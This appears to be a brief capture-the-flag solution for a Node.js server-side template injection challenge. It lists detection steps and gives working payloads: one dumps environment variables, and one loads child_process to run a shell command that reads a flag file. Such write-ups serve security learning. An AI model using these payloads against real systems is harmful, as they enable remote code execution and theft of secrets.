# Solution

1. Access to `/`
2. Try input text, echoes back input => injection vuln ?
3. Try most common template injection
4. Try `#{7*7}`, it evaluate !
5. Try to list the env vars `#{(function(){return JSON.stringify(process.env)})()}`, it works !
6. Check env vars for FLAG
7. Access FLAG_PATH and cat the file `/tmp/.file64.32738` using
```
#{(function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").execSync('cat /tmp/.file64.32738'); return sh;})()}
```
8. Get the flag

# Explanation

https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection